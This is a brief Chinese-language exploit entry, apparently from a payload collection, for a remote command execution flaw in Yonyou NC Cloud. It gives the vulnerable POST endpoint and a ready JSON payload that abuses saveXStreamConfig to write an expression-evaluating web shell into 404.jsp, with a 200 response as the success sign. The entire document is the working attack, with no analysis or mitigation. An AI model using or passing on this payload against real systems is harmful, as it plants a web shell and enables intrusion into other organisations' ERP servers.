# 用友nc-cloudRCE

用友 ｜ 命令执行 ｜ —
- **请求**：`POST /uapjs/jsinvoke/?action=invoke HTTP/1.1`

**Payload**
```
{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/404.jsp"]}
```
- **响应特征**：200